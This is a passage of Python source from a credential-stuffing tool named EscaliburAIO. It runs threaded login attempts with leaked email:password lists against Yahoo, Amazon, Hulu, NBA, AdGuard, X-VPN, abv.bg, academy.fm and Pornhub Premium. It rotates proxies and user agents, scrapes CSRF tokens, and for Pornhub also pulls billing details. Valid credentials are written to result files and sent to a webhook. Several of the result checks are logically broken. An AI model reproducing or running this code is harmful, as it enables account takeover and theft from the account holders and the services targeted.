                r = sess.post("https://xvpn.io/?n=best.free.xvpn.LoginAction", headers=headers, data=content)
                if "{\"type\":\"redirect\",\"msg\":\"\",\"url\":\"/?n=best.free.xvpn.AccountPage\"}"  in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "This email doesn't exist, try another?" or "The password is incorrect" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=XVPN_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=XVPN_check, args=(email,password, proxylist,)).start()
    def XVPN():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="X-VPN"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=XVPN_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def NBA_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                content = {"principal":email,"credential":password,"identityType":"EMAIL","apps":["responsys","billing","preferences"]}

                headers = {
                    "Content-Type":"application/json", 
                    "Host":"audience.nba.com", 
                    "Connection":"keep-alive" ,
                    "Content-Length":"132" ,
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36", 
                    "Content-type":"application/json" ,
                    "Accept":"*/*" ,
                    "Origin":"https://www.nba.com" ,
                    "Sec-Fetch-Site":"same-site" ,
                    "Sec-Fetch-Mode":"cors" ,
                    "Sec-Fetch-Dest":"empty" ,
                    "Referer":"https://www.nba.com/membership/user/login/" ,
                    "Accept-Encoding":"gzip, deflate, br" ,
                    "Accept-Language":"en-US,en;q=0.9" 
                }

                r = sess.post("https://audience.nba.com/core/api/1/user/login", headers=headers, json=content)

                if "User credentials are invalid" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "responsys.manage" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=NBA_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=NBA_check, args=(email,password, proxylist,)).start()
    def NBA():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="NBA"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=NBA_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def Yahoo_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                content = "affiliate_name=apple&friendly_name=Andy%27s+Iphone&password={}&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email={}".format(password, email) 
                
                UA = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1","Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1","Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36","Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0"]
                rua = random.choice(UA) 
                headers = {
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
                    "Accept-Encoding":"gzip, deflate, br", 
                    "Accept-Language":"en-US,en;q=0.9,fa;q=0.8", 
                    "Cache-Control":"max-age=0", 
                    "Connection":"keep-alive", 
                    "Host":"login.yahoo.com", 
                    "Referer":"https://www.google.com/", 
                    "Sec-Fetch-Dest":"document", 
                    "Sec-Fetch-Mode":"navigate", 
                    "Sec-Fetch-Site":"cross-site",
                    "Sec-Fetch-User":"?1", 
                    "Upgrade-Insecure-Requests":"1", 
                    "User-Agent": rua
                }
                f = sess.get("https://login.yahoo.com/", headers=headers)
                acrumb = search('"acrumb" value="(.*?)"', str(f.text)).group(1)
                sessionIndex = search('sessionIndex" value="(.*?)"', str(f.text)).group(1)
                lenght = len("acrumb={}&sessionIndex={}&username={}&passwd=&signin=Next".format(acrumb, sessionIndex, email))
                headers = {
                    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8", 
                    "Accept":"*/*", 
                    "Accept-Encoding":"gzip, deflate, br" ,
                    "Accept-Language":"en-US,en;q=0.9,fa;q=0.8", 
                    "bucket":"mbr-phoenix-gpst" ,
                    "Connection":"keep-alive" ,
                    "Content-Length":lenght, 
                    "Host":"login.yahoo.com" ,
                    "Origin":"https://login.yahoo.com" ,
                    "Referer":"https://login.yahoo.com/" ,
                    "Sec-Fetch-Dest":"empty" ,
                    "Sec-Fetch-Mode":"cors" ,
                    "Sec-Fetch-Site":"same-origin" ,
                    "User-Agent":rua,
                    "X-Requested-With":"XMLHttpRequest" ,
                }
                r = sess.post("https://login.yahoo.com/", data="acrumb={}&sessionIndex={}&username={}&passwd=&signin=Next".format(acrumb, sessionIndex, email), headers=headers)

                if "{\"error\":false" in r.text:
                    location = r.json('location')
                    if location.__contains__('recaptcha'):
                        threading.Thread(target=Yahoo_check, args=(email,password, proxylist,)).start()
                    else:
                        headers = {
                            "Content-Type":"application/x-www-form-urlencoded", 
                            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
                            "Accept-Encoding":"gzip, deflate, br", 
                            "Accept-Language":"en-US,en;q=0.9,fa;q=0.8", 
                            "Cache-Control":"max-age=0", 
                            "Connection":"keep-alive", 
                            "Content-Length":"1420", 
                            "Host":"login.yahoo.com", 
                            "Origin":"https://login.yahoo.com", 
                            "Referer":"https://login.yahoo.com/", 
                            "Sec-Fetch-Dest":"document", 
                            "Sec-Fetch-Mode":"navigate", 
                            "Sec-Fetch-Site":"same-origin", 
                            "Sec-Fetch-User":"?1",
                            "Upgrade-Insecure-Requests":"1", 
                            "User-Agent": rua            
                        }
                        r = sess.post(location, headers=headers, data="crumb=czI9ivjtMSr&acrumb={}&sessionIndex=QQ--&displayName={}&passwordContext=normal&password={}&verifyPassword=Next".format(acrumb, email, password))
                        if "Invalid password. Please try again" in r.text:
                            bad+=1
                            cpm+=1
                            checked+=1
                            open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                        elif "Manage Accounts" in r.text or "Sign Out" in r.text:
                            good+=1
                            cpm+=1
                            checked+=1
                            open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                            webhook("{}:{}".format(email, password))
                        elif "For your safety, choose a method below to verify that" in r.text:
                            good+=1
                            cpm+=1
                            checked+=1
                            open("results/{}/2fa.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                            webhook("{}:{}".format(email, password))    
                        else:     
                            threading.Thread(target=Yahoo_check, args=(email,password, proxylist,)).start()
                elif "{\"error\":\"messages.ERROR_INVALID_USERNAME" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=Yahoo_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=Yahoo_check, args=(email,password, proxylist,)).start()
    def Yahoo():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Hulu"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Yahoo_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def Hulu_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                content = "affiliate_name=apple&friendly_name=Andy%27s+Iphone&password={}&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email={}".format(password, email) 

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*" 
                }

                r = sess.post("https://auth.hulu.com/v1/device/password/authenticate", data=content, headers=headers)

                if "user_token" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                elif "Your login is invalid. Please try again.\"" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=Hulu_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=Hulu_check, args=(email,password, proxylist,)).start()
    def Hulu():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Hulu"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Hulu_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def AbvBG_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                url = "https://passport.abv.bg/app/profiles/login"

                content = f"service=profiles&destPage=%2Fhome&retPath=&username={email}&password={password}"

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache", 
                    "referer":"https://passport.abv.bg/app/profiles/login" 
                }

                r = sess.post(url, data=content, headers=headers)

                if "Грешен потребител / парола" or "Забравена парола" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "Изход" or "зареждане ..." or "Изпратени" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=AbvBG_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=AbvBG_check, args=(email,password, proxylist,)).start()
    def AbvBG():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Abv.bg"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=AbvBG_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def Academy_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                url = "https://academy.fm/login/?wpe-login=true"

                content = f"log={email}&pwd={password}&wp-submit=Sign+In&redirect_to=https%3A%2F%2Facademy.fm%2Fwelcome%2F"

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache" 
                }

                r = sess.post(url, data=content, headers=headers)
                if "Create your account:" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "good" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=Academy_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=Academy_check, args=(email,password, proxylist,)).start()
    def Academy():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Academy"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Academy_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def ADGuard_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                url = "https://adguard.com/en/account/login_check.html"

                content = f"username={email}&password={password}&Login="

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "Accept":"*/*", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36", 
                    "Pragma":"no-cache" 
                }

                r = sess.post(url, data=content, headers=headers)
                if "Sorry, unrecognized username or password" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "Log Out" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    open("results/{}/premium.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "Currently you don&#039;t have any license" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    open("results/{}/free.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=ADGuard_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=ADGuard_check, args=(email,password, proxylist,)).start()
    def ADGuard():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="ADGuard"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=ADGuard_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def Amazon_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                url = "https://www.amazon.com/ap/signin" 

                content = f"appActionToken=Wj2FbTjxRyCm8iJHKhcdAyKci1jQYj3D&appAction=SIGNIN_PWD_COLLECT&subPageType=SignInClaimCollect&openid.return_to=ape%3AaHR0cHM6Ly93d3cuYW1hem9uLmNvbS8%2FcmVmXz1uYXZfY3VzdHJlY19zaWduaW4%3D&prevRID=ape%3AUDFHNjNRQjdQRVRHRzlHVFpBNU4%3D&workflowState=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.ed67mlCj_dg-L93dlkTvutSUmRbO8ScOffQpsl-rNS1cKK8AKkMtcA.1w8qoLdRvPhUkj4-.3IHC7BywnYhAREaU8jfSKCCOP1jN13LOlB4EM2H7cZU3yRCX3Uu8yQ9HMi-OttA61wywsd-E4kWcRV_hdQlAxIS1GbnSG1I2f2BvU-7lY4L9NND2XYqMakiarDAhf8WZxDp0pFuGCrDBKjsplw_s28I8FF5xqOVztuGAbJmnkS9dp34zivVbPS4SdrFdAqhc45nuXJq51ES3MoDelKgaTZI6uUUvma3wta_jJsYGzhz2qLmZTejXx2cJm1H1TLa6YjWBMso7L7P2BWwjBPorUawkjtGdAzt_3yf4xIObRlgdjZddClrpJDIJ_Qg1KqZF6YEGiq_Ndn_bNcy0hreXSEI-4A9fHZSjF3dAwfhc-a_vb3fc.90ckTBHjVmO6o-3sns9-sw&email={email}&password={password}&create=0"

                headers = {
                    "content-type":"application/x-www-form-urlencoded",
                    "cookie":"skin=noskin; session-id=140-6605874-9084130; session-id-time=2082787201l; ubid-main=130-2269163-6174416;" 
                }

                r = sess.post(url, data=content, headers=headers)
                if "We cannot find an account with that email address"  in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                elif "To better protect your account, please re-enter your password and then enter the characters as they are shown in the image below." in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                else:
                    threading.Thread(target=Amazon_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=Amazon_check, args=(email,password, proxylist,)).start()
    def Amazon():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" Hello, {}, please select proxy type..".format(username))
        print(" [1] Http/s")
        print(" [2] Socks4")
        print(" [3] Socks5")
        try:
            proxy_type = int(input(" "))
        except: 
            print("  Please Enter A Valid Input..")
        if proxy_type == 1:
            proxy_type = 1
        elif proxy_type == 2:
            proxy_type = 2
        elif proxy_type == 3:
            proxy_type = 3
        else:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print(" How many threads do you want to use?")
        print()
        try:
            threads_c = int(input(" "))
        except:
            print("  Invalid input..")
            time.sleep(2)
            modules_names()
        module ="Amazon"
        screen()
        num = 0
        while 1:
            if threading.active_count() < int(threads_c):
                if len(emails) > num:
                    threading.Thread(target=Amazon_check, args=(emails[num],passwords[num], proxylist,)).start()
                    num += 1

    def PornPortal_check(email, password, proxylist):
        global proxy_line
        global errors, good, bad, cpm, checked, banned, proxy_type
        try:
            with requests.Session() as sess:
                
                if proxy_type == 1:
                    proxy_get("https")
                elif proxy_type == 2:
                    proxy_get("socks4")
                elif proxy_type == 3:
                    proxy_get("socks5")
                else:
                    proxy_get("https")
                sess.proxies = proxy_line

                
                hd= {
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                    "Pragma":"no-cache", 
                    "Accept":"*/*", 
                    "Host":"de.pornhubpremium.com", 
                    "Origin":"https://de.pornhubpremium.com", 
                    "Referer":"https://de.pornhubpremium.com/premium/login", 
                }
                f = sess.get("https://de.pornhubpremium.com/premium/login", headers=hd)

                csrf = search(r'ue=\"(.*?)\" />', str(f.text)).group(1)

                content = "username={}&password={}&token={}&redirect=&from=pc_premium_login&segment=straigh".format(email, password, csrf) 

                headers = {
                    "Content-Type":"application/x-www-form-urlencoded", 
                    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                    "Pragma":"no-cache", 
                    "Accept":"*/*", 
                    "Host":"de.pornhubpremium.com", 
                    "Origin":"https://de.pornhubpremium.com", 
                    "Referer":"https://de.pornhubpremium.com/premium/login", 
                }

                r = sess.post("https://de.pornhubpremium.com/front/authenticate", headers=headers, data=content)

                if "success\":\"1\"" in r.text:
                    good+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/good.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                    webhook("{}:{}".format(email, password))
                    headers = {
                        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
                        "Pragma":"no-cache", 
                        "Accept":"*/*", 
                        "Referer":"https://de.pornhubpremium.com/user/security" 
                    }

                    x = sess.get("https://de.pornhubpremium.com/user/manage/start", headers=headers)

                    ssa = search(r'data: \'(.*?)\'', str(x.text)).group(1)
                    next_billing = search(r'Next Billing Date (.*?)</date></', str(x.text)).group(1)

                    headers = {
                        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
                        "Pragma":"no-cache", 
                        "Accept":"*/*" 
                    }

                    c = sess.get("https://ppp.contentdef.com/ui/render?data={}".format(ssa), headers=headers)
                    portal = search(r'<i class=\"pp-sub-menu-ico arrow\"></i>(.*?)<', str(x.text)).group(1)

                    open("results/{}/plan.txt".format(today), "a+").write("{}:{} | Next Billing: {} | Portal: {}\n".format(email, password, next_billing, portal))
                elif "success\":\"0\"" in r.text:
                    bad+=1
                    cpm+=1
                    checked+=1
                    open("results/{}/bad.txt".format(today), "a+").write("{}:{}\n".format(email, password))
                else:
                    threading.Thread(target=PornPortal_check, args=(email,password, proxylist,)).start()

        except:
            errors+=1
            threading.Thread(target=PornPortal_check, args=(email,password, proxylist,)).start()
    def PornPortal():
        global username
        global proxy_type, module
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
